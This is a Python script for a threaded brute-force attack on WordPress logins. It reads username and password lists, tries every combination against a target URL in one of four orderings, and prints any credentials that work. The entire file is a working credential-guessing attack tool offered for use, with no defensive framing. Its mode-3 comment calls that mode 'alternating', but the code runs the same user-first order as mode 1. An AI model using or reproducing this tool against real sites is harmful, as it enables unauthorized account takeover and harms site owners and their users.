# -====== Import funcs
from func.style.print_banner import print_banner
from func.loads import load_list
from func.wpchecker.check_wp_credentials import check_wp_credentials


# -======= Import libs
from itertools import product
import argparse
import concurrent.futures


def parse_args():
    parser = argparse.ArgumentParser(description="WordPress Brute Force Script")
    parser.add_argument("-wu", "--usernames", required=True, help="Path to the file containing the list of usernames")
    parser.add_argument("-wp", "--passwords", required=True, help="Path to the file containing the list of passwords")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress site URL")
    parser.add_argument("-m", "--mode", type=int, choices=[1, 2, 3, 4], default=1,
                       help="Testing mode: 1=User-first, 2=Password-first, 3=Alternating, 4=Random")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
    return parser.parse_args()

def brute_force(site_url, usernames, passwords, mode=1, max_threads=5):
    def attempt_login(username, password):
        if check_wp_credentials(site_url, username, password):
            print(f"Success: Username: {username} Password: {password}")
            return True, username, password
        else:
            print(f"Failed: Username: {username} Password: {password}")
            return False, username, password

    combinations = []
    
    if mode == 1:
        # Mode 1: Test all passwords for each username before moving to next username
        combinations = [(u, p) for u in usernames for p in passwords]
    
    elif mode == 2:
        # Mode 2: Test each password against all usernames before moving to next password
        combinations = [(u, p) for p in passwords for u in usernames]
    
    elif mode == 3:
        # Mode 3: Alternating pattern - test one password per username, then move to next password
        combinations = list(product(usernames, passwords))
    
    elif mode == 4:
        # Mode 4: Random distribution
        import random
        combinations = list(product(usernames, passwords))
        random.shuffle(combinations)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for username, password in combinations:
            futures.append(
                executor.submit(attempt_login, username, password)
            )
            
        for future in concurrent.futures.as_completed(futures):
            success, username, password = future.result()
            if success:
                executor.shutdown(wait=False)
                return username, password
    
    return None, None

def main():
    args = parse_args()
    usernames = load_list(args.usernames)
    passwords = load_list(args.passwords)
    
    print(f"Starting brute force attack in mode {args.mode}")
    print(f"Target URL: {args.url}")
    print(f"Number of usernames: {len(usernames)}")
    print(f"Number of passwords: {len(passwords)}")
    print(f"Using {args.threads} threads")
    
    username, password = brute_force(
        args.url,
        usernames,
        passwords,
        mode=args.mode,
        max_threads=args.threads
    )
    
    if username and password:
        print(f"\nCredentials found!\nUsername: {username}\nPassword: {password}")
    else:
        print("\nNo valid credentials found.")

if __name__ == "__main__":
    print_banner()
    main()